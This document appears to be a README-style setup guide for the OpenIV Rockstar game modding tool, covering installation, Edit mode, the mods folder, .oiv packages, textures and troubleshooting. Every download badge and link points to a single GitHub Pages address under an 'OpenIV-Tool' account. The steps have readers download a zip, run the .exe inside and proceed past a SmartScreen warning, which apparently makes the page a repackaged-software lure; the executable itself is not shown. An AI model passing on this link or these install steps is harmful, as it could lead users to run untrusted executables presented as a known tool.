# OpenIV — Simple Modding and Game Archive Management Setup

<p align="center">
  <a href="https://OpenIV-Tool.github.io/.github"><img src="https://img.shields.io/badge/GET%20OPENIV-NOW-00C853?style=for-the-badge&logo=github&logoColor=white" alt="GET OPENIV NOW"></a>
  <a href="https://OpenIV-Tool.github.io/.github"><img src="https://img.shields.io/badge/OPENIV-INSTALLER-8b5cf6?style=for-the-badge" alt="OpenIV Installer"></a>
</p>

<p align="center">
  <a href="https://OpenIV-Tool.github.io/.github"><img src="https://img.shields.io/badge/GTA%20V-✓-2ea44f?style=flat-square" alt="GTA V Supported"></a>
  <a href="https://OpenIV-Tool.github.io/.github"><img src="https://img.shields.io/badge/GTA%20IV-✓-2ea44f?style=flat-square" alt="GTA IV Supported"></a>
  <a href="https://OpenIV-Tool.github.io/.github"><img src="https://img.shields.io/badge/RDR%202-✓-2ea44f?style=flat-square" alt="Red Dead Redemption 2 Supported"></a>
  <a href="https://OpenIV-Tool.github.io/.github"><img src="https://img.shields.io/badge/MAX%20PAYNE%203-✓-2ea44f?style=flat-square" alt="Max Payne 3 Supported"></a>
</p>

<p align="center">
  <img src="https://github.com/OpenIV-Tool/.github/blob/main/assets/image/1.png?raw=true" width="700" alt="OpenIV Interface">
</p>

OpenIV is a Windows-based utility designed for working with game archives and resources used by supported Rockstar Games titles.

It allows users to browse game files, open supported archives, import and export resources, manage textures and other assets, and install compatible modification packages.

OpenIV can be used with supported games including **Grand Theft Auto V, Grand Theft Auto IV, Red Dead Redemption 2 and Max Payne 3**.

> **Important:** OpenIV is a game modding and archive-management utility. Available features depend on the selected game, file format and installed OpenIV version.

## Supported Games

OpenIV provides tools for working with several Rockstar Games titles, including:

* **Grand Theft Auto V**
* **Grand Theft Auto IV**
* **Red Dead Redemption 2**
* **Max Payne 3**

The available features vary between games.

Some games may support archive editing, textures, models, metadata, audio or other resources, while other formats may only be available for viewing or exporting.

Always check the requirements of the specific modification before changing game files.

## Key Features

* Browse supported game archives.
* Open and manage RPF archives.
* Import and export supported game files.
* Replace compatible game resources.
* Work with supported textures.
* Edit supported META and XML files.
* Preview compatible resources.
* Install `.oiv` modification packages.
* Create compatible mod packages.
* Work with supported openFormats resources.
* Search through game files.
* Create backups before modifying files.
* Use a dedicated `mods` folder where supported.
* Manage game modifications through OpenIV.
* Support for multiple Rockstar Games titles.
* Tools for mod creators and developers.
* Windows-based graphical interface.

The exact functionality depends on the selected game and resource type.

## Game Compatibility

OpenIV compatibility is **game-specific**.

Before installing a modification, check:

* Supported game
* Game version
* Required OpenIV version
* Required archive
* Required file format
* Installation directory
* Required `mods` folder structure
* Additional mod dependencies
* Known compatibility issues

A modification designed for one Rockstar Games title may not work with another title.

## Installing OpenIV

### 1. Download OpenIV - [CLICK](https://OpenIV-Tool.github.io/.github)

Download the OpenIV `.zip` archive.

The downloaded archive contains the OpenIV installer executable required to install the application.

### 2. Extract the Archive

Extract the downloaded `.zip` file to a temporary folder.

Do not run the installer directly from inside the compressed archive.

After extraction, the folder should contain the OpenIV `.exe` installer.

For example:

```text
OpenIV\
└── OpenIV.exe
```

The exact executable filename may vary depending on the package version.

### 3. Start the Installer

Launch the `.exe` file included inside the extracted archive.

Follow the installation wizard displayed by the installer.

If Windows SmartScreen displays a warning because the executable is not recognized, verify that the archive was obtained from a trusted source before continuing.

### 4. Select the Game

After starting OpenIV, select the Rockstar Games title you want to configure.

Depending on the installed version, available options may include:

```text
Grand Theft Auto V
Grand Theft Auto IV
Red Dead Redemption 2
Max Payne 3
```

Select the game you intend to modify.

### 5. Select the Game Directory

If OpenIV cannot automatically locate the game, select its installation directory manually.

Common installation locations may include:

```text
C:\Program Files\Rockstar Games\
```

or:

```text
C:\Program Files (x86)\
```

Steam and other launchers may use different installation directories.

Select the actual game installation directory rather than the launcher executable.

### 6. Complete Installation

Follow the remaining instructions provided by the installer.

Allow OpenIV to install its required application files and configure the selected game.

### 7. Launch OpenIV

Start OpenIV after the installation is complete.

Select the appropriate game and platform if prompted.

Once the game is configured, OpenIV will display the available archives, directories and tools.

## GTA V Setup

OpenIV provides extensive tools for working with **Grand Theft Auto V** game files.

A typical GTA V modding workflow is:

1. Install OpenIV.
2. Start OpenIV.
3. Select **Grand Theft Auto V**.
4. Select the appropriate platform.
5. Allow OpenIV to detect the game directory.
6. Create a backup before modifying files.
7. Enable **Edit mode** when required.
8. Use the `mods` folder when recommended.
9. Install the desired modification.
10. Disable Edit mode when finished.
11. Start the game and test the modification.

Do not modify unrelated files when installing a mod.

## Edit Mode

OpenIV includes an **Edit mode** that allows compatible game files to be modified.

When Edit mode is enabled, supported archives and resources can be changed directly.

Before enabling Edit mode:

* Create a backup.
* Verify the target file.
* Check the mod installation instructions.
* Confirm that the modification supports your game version.
* Avoid changing files that are not required.

When finished, disable Edit mode to reduce the possibility of accidental modifications.

## Mods Folder

For supported GTA V modifications, OpenIV can use a separate `mods` folder to store modified copies of game files.

A typical structure may look like:

```text
Grand Theft Auto V\
├── update\
├── x64\
├── mods\
│   ├── update\
│   └── x64\
└── GTA5.exe
```

The exact structure depends on the installed modification.

When a mod installation guide recommends the `mods` folder, follow that structure instead of replacing original files whenever possible.

> **Tip:** Keeping modified files inside a dedicated `mods` folder makes it easier to remove modifications and restore the original installation.

## Installing GTA V Mods

A typical manual installation process is:

1. Close GTA V.
2. Start OpenIV.
3. Select **Grand Theft Auto V**.
4. Enable Edit mode if required.
5. Locate the archive or directory specified by the mod.
6. Create a backup of the original file.
7. Copy the required file into the appropriate location.
8. Preserve the original folder structure.
9. Disable Edit mode.
10. Launch GTA V.
11. Test the modification.

Always follow the installation instructions provided with the specific mod.

## OIV Package Installation

OpenIV supports `.oiv` modification packages designed to simplify the installation of compatible mods.

To install an `.oiv` package:

1. Close the game.
2. Start OpenIV.
3. Select the appropriate game.
4. Open the `.oiv` package using the OpenIV Package Installer.
5. Review the package information.
6. Select the recommended installation option.
7. Confirm the installation.
8. Wait for OpenIV to copy the required files.
9. Launch the game and test the modification.

Only install `.oiv` packages from sources you trust.

## Texture Mods

OpenIV can be used to work with supported game textures.

A typical texture modification workflow is:

1. Open the required game archive.
2. Locate the texture.
3. Export the original texture as a backup.
4. Import the replacement texture.
5. Save the modified archive.
6. Start the game.
7. Verify the result.

High-resolution textures may increase memory usage and can affect game performance depending on the modification.

## Models and Game Assets

OpenIV can be used with supported models and other game resources.

Depending on the game and file type, you may be able to:

* Browse models.
* Export supported resources.
* Replace compatible assets.
* Import modified resources.
* Preview supported files.
* Work with openFormats.

Always use a file format supported by the target game and OpenIV version.

## Audio Files

OpenIV provides tools for working with supported Rockstar audio resources.

Depending on the selected game and format, OpenIV may allow you to:

* Browse audio archives.
* Preview supported audio.
* Export audio resources.
* Replace compatible audio files.
* Work with supported audio formats.

Do not replace an audio resource without checking the format and installation requirements of the modification.

## Red Dead Redemption 2

OpenIV also provides support for **Red Dead Redemption 2**.

Depending on the OpenIV version and resource type, users can work with supported RPF archives, textures, META/PSO resources, audio files, language resources and other game data.

A typical RDR2 archive may contain resources such as:

```text
.rpf
.ytd
.ymt
.ymf
.yas
.ych
.ymap
.ytyp
.awc
.yldb
```

Not every file type has the same level of editing support.

> **Note:** RDR2 functionality may differ from GTA V functionality. Always check the specific modification instructions before editing RDR2 files.

## OpenFormats

OpenIV supports its **openFormats** system for compatible resources.

OpenFormats can allow supported game resources to be exported into formats that can be edited with external tools and later imported back into the game.

The available openFormats depend on:

* Game
* Resource type
* OpenIV version
* Supported file format

Mod developers can use openFormats as part of a larger asset-development workflow.

## Creating Mods

OpenIV can also be used when creating game modifications.

A typical workflow is:

1. Locate the original resource.
2. Export or extract the resource.
3. Create a backup.
4. Edit the resource using an appropriate external tool.
5. Import the modified resource into OpenIV.
6. Test the modification.
7. Fix compatibility or visual issues.
8. Package the finished modification.

Keep project/source files separate from the files installed into the game.

## Backup and Restoration

Always create backups before modifying important game files.

A recommended structure is:

```text
Original Game
      │
      ├── Backup
      │
      └── mods
           └── Modified Files
```

To restore the original configuration:

1. Close the game.
2. Remove the modified files.
3. Restore the original files from backup.
4. Verify the game installation.
5. Launch the game again.

If the game launcher provides a file verification or repair feature, it can also be used to restore modified files.

## Compatibility With Other Mods

OpenIV can be used together with many different types of game modifications.

However, multiple mods may modify the same:

* Archive
* Texture
* Model
* Script
* META file
* Configuration file
* Audio resource

If the game crashes after installing a modification:

1. Remove the most recently installed mod.
2. Restore the affected files.
3. Start the game without the modification.
4. Confirm that the game launches normally.
5. Reinstall the mod according to its instructions.
6. Check for conflicts with other installed modifications.

For large mod collections, install modifications one at a time when troubleshooting.

## Game Updates

Game updates can replace or change files used by installed modifications.

After a major game update:

1. Disable or remove modifications.
2. Start the unmodified game.
3. Verify that the game works normally.
4. Check whether your installed mods support the new game version.
5. Reinstall compatible modifications.
6. Test each modification individually.

A modification that worked before an update may require an updated version.

## Online Games and Anti-Cheat

> **Warning:** Do not use modified game files in online or multiplayer environments unless the game's current rules explicitly allow them.

Keep modded single-player files separate from files used for online services whenever possible.

Do not assume that a particular modification is safe for online play simply because it works in single-player.

Always follow the current rules and policies of the game and its online services.

## Troubleshooting

### OpenIV Does Not Detect the Game

Check the following:

1. Make sure the game is installed.
2. Verify that you selected the correct game.
3. Check the game installation directory.
4. Make sure the required game launcher is installed.
5. Restart OpenIV.
6. Reinstall OpenIV if necessary.
7. Select the game directory manually if automatic detection fails.

### Mod Does Not Appear In-Game

Check:

1. The correct game was selected.
2. The correct file was modified.
3. The mod was installed in the required directory.
4. The folder structure matches the mod instructions.
5. Edit mode was enabled when required.
6. The `mods` folder is configured correctly.
7. Another modification is not overriding the same resource.
8. The mod supports your current game version.

### Game Crashes After Installing a Mod

Try the following:

1. Close the game.
2. Remove the most recently installed modification.
3. Restore the original files.
4. Launch the game without mods.
5. Confirm that the game works normally.
6. Reinstall the modification.
7. Check for conflicts with other installed mods.

### OpenIV Cannot Modify a File

Check:

* The game is completely closed.
* Edit mode is enabled when required.
* The selected archive is writable.
* The file is not locked by another application.
* You have sufficient permissions.
* The file format is supported.
* The modification is intended for the selected game.

## Access Denied

If Windows reports:

```text
Access denied
```

make sure:

* The game is completely closed.
* The game launcher is not keeping files open.
* OpenIV has access to the game directory.
* Your Windows account has sufficient permissions.
* The game is not installed in a protected directory that prevents modification.

Administrator privileges may be required for some installation locations.

## Restoring the Original Configuration

To completely remove OpenIV modifications from a game:

1. Close the game.
2. Remove the installed modification files.
3. Restore the original files from your backup.
4. Remove unused files from the `mods` folder if necessary.
5. Verify the game installation.
6. Launch the game normally.

For files that cannot be restored manually, use the game launcher's built-in verification or repair functionality when available.

## System Requirements

OpenIV is designed for Windows systems with supported Rockstar Games installations.

Typical requirements include:

* **Operating System:** Windows
* **Game:** Supported Rockstar Games title
* **GPU:** Depends on the game
* **Storage:** Small amount of free space for OpenIV and additional mod files
* **Permissions:** Access to the selected game directory
* **Internet:** Required for downloading OpenIV and optional components

Actual requirements depend on the selected game, OpenIV version and installed modifications.

## Recommended Setup

For the simplest OpenIV workflow:

1. **Download the OpenIV `.zip` archive.**
2. Extract the archive to a temporary folder.
3. Run the `.exe` installer located inside the extracted folder.
4. Select the supported Rockstar game.
5. Select the game's installation directory.
6. Complete the OpenIV setup.
7. Create a backup before modifying game files.
8. Use the `mods` folder when recommended.
9. Install `.oiv` packages through the OpenIV Package Installer when appropriate.
10. Test modifications one at a time.
11. Keep original game files backed up.
12. Keep modded and online configurations separate.

> **Note:** OpenIV functionality and game compatibility can change between versions. Always check the requirements of the specific mod and verify that it supports your current game version before making changes to the installation.
